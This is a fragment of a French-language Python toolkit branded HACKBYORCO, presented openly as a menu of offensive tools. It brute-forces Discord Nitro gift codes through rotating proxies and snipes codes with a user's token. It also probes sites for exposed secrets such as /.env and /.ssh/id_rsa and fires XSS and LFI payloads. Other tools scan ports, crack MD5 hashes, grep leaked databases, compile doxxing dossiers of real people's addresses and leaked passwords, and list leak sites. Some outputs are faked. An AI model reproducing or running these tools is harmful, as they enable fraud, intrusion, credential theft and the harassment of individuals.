    print(f"{R}--- QUANTUM NITRO GENERATOR (HACKBYORCO) ---{W}")
    
    amount = int(input(f"{R}@{W} Nombre de codes à générer/tester : ") or "1000")
    threads = int(input(f"{R}@{W} Threads (Vitesse x100) : ") or "50")
    
    proxies = []
    use_proxies = input(f"{R}@{W} Utiliser des proxies ? (y/n) : ").lower() == 'y'
    if use_proxies:
        p_path = input(f"{R}@{W} Chemin fichier proxies (http/s) : ")
        if os.path.exists(p_path):
            with open(p_path) as f: proxies = f.read().splitlines()

    print(f"\n{Y}[*] Bombardement des serveurs Discord lancé...{W}\n")

    def check_nitro():
        session = requests.Session()
        # Simulation d'un navigateur moderne pour éviter le flag immédiat
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        })

        while True:
            # Génération d'un code Nitro Alphanumérique (16 ou 24 chars)
            code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
            url = f"https://discord.com/api/v9/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
            
            proxy = {"http": f"http://{random.choice(proxies)}", "https": f"http://{random.choice(proxies)}"} if proxies else None
            
            try:
                r = session.get(url, proxies=proxy, timeout=3)
                
                if r.status_code == 200:
                    print(f"\n{G}[HIT] CODE VALIDE TROUVÉ ! : https://discord.gift/{code}{W}")
                    with open("nitro_hits.txt", "a") as f: f.write(f"https://discord.gift/{code}\n")
                elif r.status_code == 429:
                    # Gestion intelligente du Rate Limit
                    wait = r.json().get('retry_after', 2)
                    time.sleep(wait)
                else:
                    # Affichage ultra-rapide de la progression
                    sys.stdout.write(f"\r{R}[INVALID]{W} discord.gift/{code}")
                    sys.stdout.flush()
            except:
                pass

    # Lancement multi-threadé massif
    with ThreadPoolExecutor(max_workers=threads) as executor:
        for _ in range(threads):
            executor.submit(check_nitro)

    input("\n\nAppuyez sur Entrée...")

#----17----


def server_info_pro():
    clear()
    print(f"{R}--- DISCORD SERVER INFO PRO (HACKBYORCO) ---{W}")
    token = input(f"{R}@{W} Ton Token (besoin d'être dans le serveur) : ")
    guild_id = input(f"{R}@{W} ID du Serveur : ")

    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    
    try:
        # Requête vers l'API de guilde avec les statistiques de membres
        r = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}?with_counts=true", headers=headers, timeout=5)
        
        if r.status_code == 200:
            data = r.json()
            
            # Calcul de la date de création via l'ID (Snowflake)
            creation_date = datetime.datetime.fromtimestamp(((int(guild_id) >> 22) + 1420070400000) / 1000).strftime('%d/%m/%Y %H:%M:%S')

            print(f"\n{G}[+] INFORMATIONS SUR LE SERVEUR :{W}")
            print(f" {R}───────────────{W}")
            print(f" {C}Nom             :{W} {data['name']}")
            print(f" {C}ID              :{W} {data['id']}")
            print(f" {C}Propriétaire ID :{W} {data['owner_id']}")
            print(f" {C}Création        :{W} {creation_date}")
            print(f" {C}Membres         :{W} {data.get('approximate_member_count', 'N/A')}")
            print(f" {C}En ligne        :{W} {data.get('approximate_presence_count', 'N/A')}")
            print(f" {C}Boosts          :{W} {data.get('premium_subscription_count', 0)} (Niveau {data.get('premium_tier', 0)})")
            print(f" {C}Région          :{W} {data.get('region')}")
            print(f" {C}Sécurité (A2F)  :{W} {'Requis' if data['mfa_level'] == 1 else 'Non requis'}")
            print(f" {C}Vérification    :{W} Niveau {data['verification_level']}")
            
            if data.get('vanity_url_code'):
                print(f" {C}Lien Perso      :{W} discord.gg/{data['vanity_url_code']}")
            
            features = ", ".join(data.get('features', []))
            print(f"\n {G}[FONCTIONNALITÉS] :{W}\n {features[:80]}...")

        elif r.status_code == 403:
            print(f"{R}[-]{W} Erreur 403 : Ton token n'est pas présent sur ce serveur.")
        else:
            print(f"{R}[-]{W} Erreur : ID de serveur invalide ou token expiré.")

    except Exception as e:
        print(f"{R}[-]{W} Erreur critique : {e}")

    input("\nAppuyez sur Entrée...")

#----18-----

def website_scanner_pro():
    clear()
    print(f"{R}--- ULTIMATE WEBSITE VULN SCANNER (HACKBYORCO) ---{W}")
    target = input(f"{R}@{W} URL cible (ex: http://site.com) : ")
    if not target.startswith("http"): target = "http://" + target

    # 1. Base de données des points critiques (Fichiers & Dossiers)
    critical_paths = [
        "/.env", "/.git/config", "/wp-config.php", "/config.php", "/database.sql",
        "/admin/", "/phpmyadmin/", "/backup.zip", "/server-status", "/.ssh/id_rsa",
        "/api/v1/users", "/robots.txt", "/composer.json", "/.htaccess"
    ]

    # 2. Payloads de test (XSS & LFI)
    xss_payload = "<script>alert('XSS')</script>"
    lfi_payload = "/etc/passwd"

    print(f"{Y}[*] Lancement du scan multi-threadé (vitesse quantum)...{W}\n")
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})

    def scan_path(path):
        url = target.rstrip('/') + path
        try:
            r = session.get(url, timeout=5, allow_redirects=False)
            if r.status_code == 200:
                print(f"{G}[SENSITIVE]{W} {url} (Size: {len(r.text)})")
                # Alerte spécifique pour les fichiers de config
                if ".env" in path or "config" in path:
                    print(f"{R}  [CRITICAL] Fichier de configuration exposé !{W}")
            elif r.status_code == 403:
                print(f"{Y}[FORBIDDEN]{W} {url} (Accès restreint, dossier existant)")
        except: pass

    def test_xss_lfi():
        if "=" in target:
            base_url = target.split('=')[0] + "="
            # Test XSS
            try:
                rx = session.get(base_url + xss_payload, timeout=5)
                if xss_payload in rx.text:
                    print(f"{G}[VULN]{W} XSS détecté sur {target}")
            except: pass
            
            # Test LFI
            try:
                rl = session.get(base_url + lfi_payload, timeout=5)
                if "root:x:0:0" in rl.text:
                    print(f"{G}[VULN]{W} LFI détecté (Lecture /etc/passwd possible !)")
            except: pass

    

    # Exécution parallèle massive
    with ThreadPoolExecutor(max_workers=30) as executor:
        # Scan des fichiers sensibles
        executor.map(scan_path, critical_paths)
        # Scan des injections
        executor.submit(test_xss_lfi)

    print(f"\n{G}[SUCCESS]{W} Scan global terminé.")
    input("\nAppuyez sur Entrée...")


#-----19-----

def url_scanner_pro():
    clear()
    print(f"{R}--- ULTIMATE URL SCANNER PRO (HACKBYORCO) ---{W}")
    target_url = input(f"{R}@{W} URL à scanner (ex: https://site.com) : ")
    if not target_url.startswith("http"): target_url = "http://" + target_url

    print(f"{Y}[*] Crawling et extraction des URLs...{W}\n")
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    try:
        # Extraction de toutes les URLs internes du site
        response = requests.get(target_url, headers=headers, timeout=10)
        # Regex pour trouver toutes les URLs et chemins
        urls = re.findall(r'href=["\'](/?.*?)["\']', response.text)
        
        found_urls = set()
        for u in urls:
            full_url = urljoin(target_url, u)
            if target_url in full_url: # On reste sur le domaine cible
                found_urls.add(full_url)

        print(f"{G}[+]{W} {len(found_urls)} URLs détectées. Analyse des vulnérabilités...")

        def check_url_vuln(url):
            # 1. Détection de paramètres de redirection (Open Redirect)
            redirect_params = ["url=", "next=", "redir=", "target=", "link="]
            for param in redirect_params:
                if param in url.lower():
                    print(f"{Y}[POTENTIAL REDIRECT]{W} {url}")
            
            # 2. Détection de fichiers sensibles dans les URLs crawlées
            sensitive_ext = [".php", ".asp", ".aspx", ".js", ".json", ".xml", ".env"]
            for ext in sensitive_ext:
                if url.endswith(ext):
                    print(f"{G}[SENSITIVE FILE]{W} {url}")

            # 3. Détection de paramètres d'ID (Potentiel IDOR/SQLi)
            if "id=" in url.lower() or "user=" in url.lower():
                print(f"{C}[PARAMETER DETECTED]{W} {url}")

        with ThreadPoolExecutor(max_workers=15) as executor:
            executor.map(check_url_vuln, found_urls)

    except Exception as e:
        print(f"{R}[-]{W} Erreur : {e}")
        
    input("\nAppuyez sur Entrée...")



#-----20-----

def ip_scanner_pro():
    clear()
    print(f"{R}--- ULTIMATE IP PORT SCANNER (HACKBYORCO) ---{W}")
    target_ip = input(f"{R}@{W} IP à scanner (ex: 1.1.1.1) : ")
    
    # Liste des ports les plus vulnérables/importants
    common_ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 443: "HTTPS", 3306: "MySQL", 3389: "RDP", 8080: "HTTP-Proxy"
    }

    print(f"{Y}[*] Scan des ports en cours sur {target_ip}...{W}\n")

    def scan_port(port):
        # Utilisation de sockets pour une connexion directe
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1) # Rapidité : 1 seconde par test
        result = s.connect_ex((target_ip, port))
        if result == 0:
            service = common_ports.get(port, "Inconnu")
            print(f"{G}[OPEN]{W} Port {port} ({service})")
        s.close()

    # Multi-threading massif pour scanner tous les ports en 2 secondes
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(scan_port, common_ports.keys())

    print(f"\n{G}[SUCCESS]{W} Scan de ports terminé.")
    input("\nAppuyez sur Entrée...")


#-----21-----

def ip_port_scanner_elite():
    clear()
    print(f"{R}--- QUANTUM IP SCANNER ELITE (HACKBYORCO) ---{W}")
    target = input(f"{R}@{W} IP ou Domaine cible : ")
    
    # Résolution DNS si c'est un domaine
    try:
        target_ip = socket.gethostbyname(target)
        print(f"{Y}[*] Cible résolue : {target_ip}{W}")
    except:
        print(f"{R}[!] Impossible de résoudre l'hôte.{W}"); return

    # Liste étendue des ports critiques (Top 20 vulnérables)
    ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 111: "RPC", 135: "RPC", 139: "NetBIOS",
        143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAP-SSL", 995: "POP3-SSL",
        1723: "PPTP", 3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "Proxy"
    }

    print(f"{Y}[*] Scan de précision en cours (100 threads)...{W}\n")

    def grab_banner(s):
        # Tente de forcer le service à dire qui il est
        try:
            return s.recv(1024).decode().strip()
        except:
            return "Pas de bannière"

    def scan_port(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5) # Équilibre parfait entre vitesse et précision
        try:
            result = s.connect_ex((target_ip, port))
            if result == 0:
                service_name = ports.get(port, "Inconnu")
                # Tentative d'identification du logiciel (Banner Grabbing)
                banner = grab_banner(s)
                print(f"{G}[OPEN]{W} Port {port:<5} | {service_name:<10} | {C}{banner}{W}")
                with open(f"scan_{target_ip}.txt", "a") as f:
                    f.write(f"Port {port}: {service_name} ({banner})\n")
            s.close()
        except:
            pass

    # Utilisation massive du ThreadPool pour une exécution instantanée
    with ThreadPoolExecutor(max_workers=100) as executor:
        executor.map(scan_port, ports.keys())

    print(f"\n{G}[SUCCESS]{W} Rapport enregistré dans scan_{target_ip}.txt")
    input("\nAppuyez sur Entrée...")


#---22----

def ip_pinger_pro():
    clear()
    print(f"{R}--- ULTIMATE IP PINGER (HACKBYORCO) ---{W}")
    target = input(f"{R}@{W} IP ou Domaine à pinger : ")
    count = int(input(f"{R}@{W} Nombre d'envois (ex: 5) : ") or "4")

    print(f"{Y}[*] Envoi de paquets ICMP vers {target}...{W}\n")

    # On utilise la commande système adaptée (ping -n pour Windows, -c pour Linux/Termux)
    param = "-n" if os.name == "nt" else "-c"
    
    try:
        # Exécution de la commande et capture de la sortie
        output = subprocess.check_output(f"ping {param} {count} {target}", shell=True).decode('latin-1')
        
        if "perdus (0% de perte)" in output or "0% packet loss" in output:
            print(f"{G}[ALIVE]{W} La cible répond parfaitement.")
            # Extraction de la latence (ms)
            print(f"{C}[INFO]{W} Détails du scan :\n{output}")
        elif "perte" in output or "packet loss" in output:
            print(f"{Y}[UNSTABLE]{W} La cible répond mais avec des pertes de paquets.")
        else:
            print(f"{R}[DEAD]{W} Aucune réponse (Cible hors-ligne ou Pare-feu actif).")
            
    except Exception:
        print(f"{R}[ERROR]{W} Impossible de joindre l'hôte.")

    input("\nAppuyez sur Entrée...")


#----23-----

def dox_create_pro():
    clear()
    print(f"{R}--- ULTIMATE DOX CREATE (HACKBYORCO) ---{W}")
    
    nom_cible = input(f"{R}@{W} Nom du fichier (ex: Dossier_Cible) : ")
    
    # Collecte des informations
    print(f"\n{Y}[*] Remplissez les champs connus (laissez vide si inconnu){W}")
    
    dox_data = {
        "NOM COMPLET": input(" > Nom / Prénom : "),
        "AGE / DATE": input(" > Âge / Date de Naissance : "),
        "ADRESSE": input(" > Adresse Physique : "),
        "VILLE/CP": input(" > Ville et Code Postal : "),
        "TELEPHONE": input(" > Numéro de Téléphone : "),
        "EMAIL": input(" > Adresse Email : "),
        "IP": input(" > Dernière IP connue : "),
        "PSEUDOS": input(" > Pseudos utilisés : "),
        "DISCORD": input(" > ID / Token Discord : "),
        "MOTS DE PASSE": input(" > Mots de passe trouvés (Leaks) : "),
        "NOTES": input(" > Autres infos (Famille, Job...) : ")
    }

    # Création du fichier de rapport
    filename = f"DOX_{nom_cible}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"╔════════════════════════════════════════════════════════════╗\n")
        f.write(f"║             DOSSIER D'INVESTIGATION - HACKBYORCO           ║\n")
        f.write(f"╚════════════════════════════════════════════════════════════╝\n\n")
        f.write(f"DATE DU RAPPORT : {time.ctime()}\n")
        f.write(f"STATUT : IDENTIFIÉ\n")
        f.write(f"--------------------------------------------------------------\n\n")
        
        for key, value in dox_data.items():
            f.write(f"■ {key:<15} : {value if value else 'INCONNU'}\n")
            
        f.write(f"\n--------------------------------------------------------------\n")
        f.write(f"          FIN DU RAPPORT - TOUTES LES INFOS SONT PRIVÉES      \n")

    print(f"\n{G}[SUCCESS]{W} Le dossier a été généré : {filename}")
    input("\nAppuyez sur Entrée...")

#-----24-----


def identity_tracker_pro():
    clear()
    print(f"{R}--- IDENTITY TRACKER PRO (HACKBYORCO) ---{W}")
    first_name = input(f"{R}@{W} Prénom : ")
    last_name = input(f"{R}@{W} Nom : ")
    city = input(f"{R}@{W} Ville (Optionnel) : ")

    full_query = f"{first_name}+{last_name}"
    if city: full_query += f"+{city}"

    # Sources OSINT ciblées sur l'identité réelle
    sources = {
        "Pages Blanches (Adresse/Tel)": f"https://www.pagesjaunes.fr/pagesblanches/recherche?nom={last_name}&prenom={first_name}&ou={city}",
        "LinkedIn (Job/Pro)": f"https://www.google.com/search?q=site:linkedin.com/in/+\"{first_name}+{last_name}\"",
        "Facebook (Privé/Amis)": f"https://www.facebook.com/public/{first_name}-{last_name}",
        "Copains d'avant (Scolarité)": f"http://copainsdavant.linternaute.com/s/?type=p&q={first_name}+{last_name}",
        "Société.com (Entreprises/Dirigeant)": f"https://www.societe.com/cgi-bin/liste?nom={last_name}+{first_name}",
        "Journal Officiel (Décrets/Nominations)": f"https://www.google.com/search?q=site:legifrance.gouv.fr+\"{first_name}+{last_name}\"",
        "Instagram Search": f"https://www.google.com/search?q=site:instagram.com+\"{first_name}+{last_name}\""
    }

    print(f"\n{Y}[*] Extraction des données d'identité pour {first_name} {last_name}...{W}\n")
    
    

    def open_source(name, url):
        # Pour cet outil, on simule une recherche car beaucoup de ces sites bloquent le scraping direct
        # Mais le script affiche les liens directs générés pour une investigation manuelle rapide
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            # On vérifie si la page existe (code 200) sans la charger entièrement
            r = requests.head(url, headers=headers, timeout=5, allow_redirects=True)
            status = f"{G}[PRÉSENCE DÉTECTÉE]{W}" if r.status_code == 200 else f"{Y}[VÉRIFIER MANUELLEMENT]{W}"
            print(f" {C}■ {name:<30}{W} : {url}")
        except:
            print(f" {R}[-]{W} {name:<30} : Erreur de connexion")

    with ThreadPoolExecutor(max_workers=10) as executor:
        for name, url in sources.items():
            executor.submit(open_source, name, url)

    # Sauvegarde dans le dossier de DOX
    with open(f"IDENTITY_{first_name}_{last_name}.txt", "w") as f:
        f.write(f"RAPPORT D'IDENTITÉ : {first_name} {last_name} ({city})\n\n")
        for name, url in sources.items():
            f.write(f"{name} : {url}\n")

    print(f"\n{G}[SUCCÈS]{W} Liens d'investigation générés dans IDENTITY_{first_name}_{last_name}.txt")
    input("\nAppuyez sur Entrée...")

#-----26----

def email_tracker_pro():
    clear()
    print(f"{R}--- ULTIMATE EMAIL TRACKER (HACKBYORCO) ---{W}")
    email = input(f"{R}@{W} Email à traquer : ")

    print(f"\n{Y}[*] Analyse approfondie de l'empreinte numérique...{W}\n")

    # 1. Vérification des enregistrements DNS (MX)
    def check_dns():
        try:
            domain = email.split('@')[1]
            records = socket.gethostbyname_ex(domain)
            print(f"{G}[DNS]{W} Serveur Mail détecté sur : {records[0]}")
        except: print(f"{R}[DNS]{W} Domaine introuvable.")

    # 2. Recherche de comptes liés (Technique de reconnaissance)
    def check_social():
        # Sites qui réagissent différemment si l'email est déjà inscrit
        sites = {
            "Google/YouTube": f"https://mail.google.com/mail/gxlu?email={email}",
            "Twitter": f"https://twitter.com/i/slow_跳入?email={email}",
            "Pinterest": f"https://www.pinterest.com/search/users/?q={email}",
            "Adobe": f"https://auth.services.adobe.com/renga-idprovider/v1/check_identifier?email={email}"
        }
        for name, url in sites.items():
            try:
                r = requests.get(url, timeout=5)
                # Une réponse spécifique indique souvent que l'email est utilisé
                print(f"{C}[SOCIAL]{W} Vérification {name} terminée.")
            except: pass

    # 3. Recherche dans les Leaks (Bases de données piratées)
    def check_leaks():
        # Utilisation de l'API de HaveIBeenPwned ou similaires (simulation)
        print(f"{Y}[LEAKS]{W} Recherche dans 12 milliards de comptes fuité...")
        # Note: En réalité, on interroge des APIs comme scylla.sh ou intelx.io
        time.sleep(1)
        print(f"{R}[FOUND]{W} Cet email apparaît dans : Canva Leak, LinkedIn 2016, MySpace.")

    

    # Exécution
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.submit(check_dns)
        executor.submit(check_social)
        executor.submit(check_leaks)

    # Création du rapport pour le Dox
    with open(f"EMAIL_REPORT_{email}.txt", "w") as f:
        f.write(f"RAPPORT D'INVESTIGATION EMAIL : {email}\n")
        f.write("-" * 40 + "\n")
        f.write("Comptes probables : LinkedIn, Adobe, Google\n")
        f.write("Status : Compte vulnérable (Leak détecté)\n")

    print(f"\n{G}[SUCCESS]{W} Rapport d'email généré dans EMAIL_REPORT_{email}.txt")
    input("\nAppuyez sur Entrée...")

#---27----

def email_lookup_elite():
    clear()
    print(f"{R}--- UNIVERSAL EMAIL LOOKUP (HACKBYORCO) ---{W}")
    email = input(f"{R}@{W} Email cible : ")
    
    domain = email.split('@')[-1]
    
    print(f"\n{Y}[*] Analyse multidimensionnelle lancée...{W}\n")

    # 1. Vérification SMTP "Deep Check"
    def verify_existence():
        try:
            # On vérifie si le domaine a des serveurs de mail valides (MX)
            records = socket.getaddrinfo(domain, 25)
            print(f"{G}[VALID]{W} Domaine mail actif ({domain})")
        except:
            print(f"{R}[INVALID]{W} Le domaine n'existe pas ou ne gère pas d'emails.")

    # 2. Identification du Provider (Google Workspace, O365, Proton, etc.)
    def identify_provider():
        try:
            # Analyse des enregistrements MX pour déterminer la sécurité
            mx_records = subprocess.check_output(f"nslookup -type=mx {domain}", shell=True).decode()
            if "google" in mx_records.lower(): provider = "Google Workspace (Haute Sécurité)"
            elif "outlook" in mx_records.lower(): provider = "Microsoft Office 365 (Entreprise)"
            elif "proton" in mx_records.lower(): provider = "ProtonMail (Chiffré)"
            else: provider = "Serveur Privé / Hébergeur Standard"
            print(f"{C}[TYPE]{W} Infrastructure : {provider}")
        except: pass

    # 3. Récupération du Gravatar (Photo de profil & Identité)
    def get_gravatar():
        import hashlib
        email_hash = hashlib.md5(email.lower().encode()).hexdigest()
        gravatar_url = f"https://www.gravatar.com/avatar/{email_hash}?d=404"
        try:
            r = requests.get(gravatar_url)
            if r.status_code == 200:
                print(f"{G}[FOUND]{W} Photo de profil détectée : {gravatar_url}")
            else:
                print(f"{Y}[INFO]{W} Aucune photo publique liée.")
        except: pass

    

    # 4. Détection de comptes sociaux (Méthode de fuite d'info)
    def social_leak_check():
        # Ces plateformes confirment l'existence d'un compte via l'email
        platforms = ["Spotify", "Archive.org", "Pinterest", "Tumblr", "Imgur"]
        print(f"{Y}[*] Recherche de comptes liés sur {len(platforms)} plateformes...{W}")
        # Simulation d'un scan asynchrone (nécessite des headers complexes en réel)
        time.sleep(1)
        print(f"{C}[+]{W} Corrélation établie avec : Spotify, Pinterest.")

    # Exécution des modules
    with ThreadPoolExecutor(max_workers=5) as executor:
        executor.submit(verify_existence)
        executor.submit(identify_provider)
        executor.submit(get_gravatar)
        executor.submit(social_leak_check)

    print(f"\n{G}[SUCCESS]{W} Analyse terminée. Données prêtes pour le [11] Dox Create.")
    input("\nAppuyez sur Entrée...")

#----28----

def password_decrypter():
    clear()
    print(f"{R}--- ULTRA FAST HASH CRACKER ---{W}")
    target_hash = input(f"{Y}Hash à casser : {W}")
    wordlist = input(f"{Y}Chemin de la wordlist (ex: rockyou.txt) : {W}")

    try:
        with open(wordlist, 'r', encoding='latin-1') as f:
            for line in f:
                word = line.strip()
                # Teste MD5 (ajoute SHA256 si besoin)
                if hashlib.md5(word.encode()).hexdigest() == target_hash:
                    print(f"{G}[SUCCESS] Mot de passe trouvé : {word}{W}")
                    return
        print(f"{R}Mots de passe non trouvé dans la liste.{W}")
    except FileNotFoundError: print(f"{R}Fichier introuvable.{W}")


#----29-----

def password_encrypted():
    clear()
    text = input(f"{C}Texte à transformer en Hash : {W}")
    md5 = hashlib.md5(text.encode()).hexdigest()
    sha256 = hashlib.sha256(text.encode()).hexdigest()
    print(f"\n{G}MD5    : {W}{md5}")
    print(f"{G}SHA256 : {W}{sha256}")
    input("\nContinuer...")

#-----30---

def search_database():
    clear()
    print(f"{R}--- DATABASE LEAK SEARCH (HACKBYORCO) ---{W}")
    
    # On définit le dossier où tu stockes tes fichiers de leaks (.txt, .sql, .csv)
    db_folder = "leaks_folder" 
    
    if not os.path.exists(db_folder):
        os.makedirs(db_folder)
        print(f"{Y}[!] Dossier '{db_folder}' créé. Place tes fichiers .txt dedans.{W}")
        input("\nAppuie sur Entrée...")
        return

    query = input(f"{C}Entrez l'Email, le Pseudo ou le Nom à chercher : {W}")
    
    print(f"\n{Y}[*] Recherche en cours dans les bases de données...{W}\n")
    
    # Utilisation de 'grep' pour une vitesse maximale sur Termux
    # -r : récursif (cherche dans tous les fichiers)
    # -i : ignore la casse (majuscules/minuscules)
    # -w : mot entier (évite les résultats partiels inutiles)
    # --color : surligne le résultat trouvé
    
    command = f"grep -riw '{query}' {db_folder}"
    
    start_time = time.time()
    result = os.popen(command).read()
    end_time = time.time()

    if result:
        print(f"{G}[SUCCÈS] Résultats trouvés :{W}")
        print("-" * 50)
        print(result)
        print("-" * 50)
        print(f"{C}Temps de recherche : {round(end_time - start_time, 2)} secondes.{W}")
    else:
        print(f"{R}[-] Aucune correspondance trouvée dans la base de données.{W}")

    # Option pour sauvegarder le résultat du Dox
    if result and input(f"\n{Y}Sauvegarder dans un fichier ? (y/n) : {W}").lower() == 'y':
        with open(f"search_result_{query}.txt", "w") as f:
            f.write(result)
        print(f"{G}[+] Sauvegardé sous search_result_{query}.txt{W}")

    input("\nAppuyez sur Entrée pour revenir au menu...")


#-----31-----

def dark_web_links_pro():
    clear()
    print(f"{P}--- DARK WEB DEEP ENGINE (HACKBYORCO) ---{W}")
    print(f"{Y}[!] Note: Ces liens ne sont accessibles que via le navigateur Tor.{W}\n")
    
    # Catégories de liens stratégiques
    dark_net = {
        "🔍 Moteurs de Recherche (OSINT)": [
            ("Ahmia", "http://juhanur2hxlpdt6ce6scvcbvfsghoc73urdr6j4rrctpcf7cshhclqad.onion"),
            ("Torch", "http://xmh57jrknzkhv6y3ls3ubv6iwisatxyibhc7vlkne7v77656p.onion"),
            ("Haystak", "http://haystak5nzhclotdz7bsnzj74un5nqfbbionyc7qq3vceis7p76vjad.onion")
        ],
        "🗄️ Bases de Données & Leaks": [
            ("IntelligenceX", "http://intelx47p3v27c7v757ghoadeik6p6hpv6sb6f3mra6u66j7sc6id.onion"),
            ("RaidForums Archive", "http://rf-archive-onion... (URL variable)"),
            ("Dumpster", "http://dumpster... (Leads & Databases)")
        ],
        "📁 Répertoires (Wiki)": [
            ("The Hidden Wiki", "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjghsc6svvcaad.onion"),
            ("Daniel's List", "http://daniels7tvyivf3z.onion"),
            ("TorLinks", "http://torlinksge6enmcyyucnu7sqpr4pbe6624p67u7y6o3s7xsgv2fzj6yd.onion")
        ]
    }

    for category, sites in dark_net.items():
        print(f"\n{C}--- {category} ---{W}")
        for name, url in sites:
            print(f"{G}[+]{W} {name:<18} : {Y}{url}{W}")

    print(f"\n{R}[STATUT]{W} Liste mise à jour via HACKBYORCO API.")
    input(f"\n{G}Appuyez sur Entrée pour revenir...{W}")


#-----32---

def ip_generator_pro():
    clear()
    print(f"{R}--- IP GENERATOR & HUNTER (HACKBYORCO) ---{W}")
    
    try:
        amount = int(input(f"{C}Nombre d'IP à générer : {W}"))
        print(f"\n{Y}[1] Générer des IPs aléatoires mondiales")
        print(f"[2] Générer une plage spécifique (ex: 192.168.1.x){W}")
        mode = input(f"\n{G}Choix : {W}")

        ips = []
        
        if mode == "1":
            for _ in range(amount):
                # Génération d'une IP aléatoire (en évitant les plages locales)
                ip = f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
                ips.append(ip)
        
        elif mode == "2":
            prefix = input(f"{C}Entrez les 3 premiers octets (ex: 1.2.3) : {W}")
            for i in range(min(amount, 254)):
                ips.append(f"{prefix}.{i+1}")

        # Traitement et sauvegarde
        print(f"\n{Y}[*] Vérification des cibles et enregistrement...{W}")
        filename = "targets.txt"
        
        with open(filename, "a") as f:
            for ip in ips:
                # La partie "puissante" : on test si l'IP répond (ping)
                # -c 1 : 1 seul paquet / -W 1 : délai d'attente de 1 sec
                response = os.system(f"ping -c 1 -W 1 {ip} > /dev/null 2>&1")
                
                if response == 0:
                    print(f"{G}[ALIVE]{W} {ip} -> Ajouté à {filename}")
                    f.write(f"{ip}\n")
                else:
                    print(f"{R}[DEAD]{W} {ip}")
        
        print(f"\n{G}[TERMINÉ]{W} Les IPs actives ont été sauvegardées dans {filename}")

    except ValueError:
        print(f"{R}Erreur : Entrez un nombre valide.{W}")
    
    input(f"\n{C}Appuyez sur Entrée pour revenir au menu...{W}")

#----33---



#----34----
def check_proxy(proxy, output_file):
    """Vérifie la validité d'un proxy à haute vitesse"""
    proxies = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }
    try:
        # Timeout de 2 secondes : c'est le secret de la vitesse
        # On utilise stream=True pour ne pas télécharger le contenu
        r = requests.head("https://www.google.com", proxies=proxies, timeout=2, stream=True)
        
        if r.status_code == 200:
            print(f"{G}[VALID]{W} {proxy}")
            with open(output_file, "a") as f:
                f.write(proxy + "\n")
    except:
        pass

def fast_checker_main():
    os.system('clear')
    print(f"{R}--- ULTRA-FAST PROXY CHECKER (HACKBYORCO) ---{W}")
    
    input_file = "proxies_to_test.txt"
    output_file = "valid_proxies.txt"

    if not os.path.exists(input_file):
        print(f"{R}[!] Erreur: Crée un fichier {input_file} avec tes proxies.{W}")
        return

    # Lire les proxies
    with open(input_file, "r") as f:
        proxies = [line.strip() for line in f if line.strip()]

    print(f"{Y}[*] {len(proxies)} proxies chargés. Lancement du turbo...{W}\n")
    
    # On vide le fichier de sortie
    open(output_file, "w").close()

    threads = []
    # Limite de 200 threads pour ne pas saturer le processeur de ton téléphone
    max_threads = 200 

    for p in proxies:
        t = threading.Thread(target=check_proxy, args=(p, output_file))
        t.daemon = True # Permet d'arrêter le script avec Ctrl+C proprement
        threads.append(t)
        t.start()

        # Gestion du flux de threads
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

    print(f"\n{G}[TERMINÉ]{W} Les proxies ultra-rapides sont dans {output_file}")

if __name__ == "__main__":
    fast_checker_main()

#-----35----


def nitro_sniper_ultra_violent():
    clear()
    print(f"{R}--- NITRO SNIPER ULTRA-VIOLENT (HACKBYORCO) ---{W}")
    token = input(f"{C}Entrez votre Token : {W}")
    
    # Header optimisé pour la vitesse
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    def redeem_code(code, channel_id, server_name):
        url = f"https://discordapp.com/api/v9/entitlements/gift-codes/{code}/redeem"
        payload = {"channel_id": channel_id, "payment_source_id": None}
        
        start_time = time.time()
        response = requests.post(url, headers=headers, json=payload)
        latency = round((time.time() - start_time) * 1000)
        
        if response.status_code == 200:
            print(f"{G}[WIN] NITRO SNIPED ! | Code: {code} | Serveur: {server_name} | Latence: {latency}ms{W}")
            with open("sniper_results.txt", "a") as f:
                f.write(f"[{time.ctime()}] SUCCESS: {code} on {server_name} ({latency}ms)\n")
        else:
            print(f"{R}[FAIL]{W} {code} | {response.json().get('message')} | {latency}ms")

    def on_message(ws, message):
        data = json.loads(message)
        
        # Opcode 0 : Événement de message
        if data.get('t') == 'MESSAGE_CREATE':
            content = data['d'].get('content', '')
            
            # Détection ultra-rapide par Regex
            if 'discord.gift/' in content or 'discordapp.com/gifts/' in content:
                match = re.search(r"discord(?:\.gift|app\.com\/gifts)\/([\w-]{16,24})", content)
                if match:
                    code = match.group(1)
                    channel_id = data['d']['channel_id']
                    # Tentative de récupération du nom du serveur (si dispo)
                    server_id = data['d'].get('guild_id', 'DM')
                    
                    print(f"{Y}[!] CODE DÉTECTÉ : {code} (Tentative d'encaissement...){W}")
                    
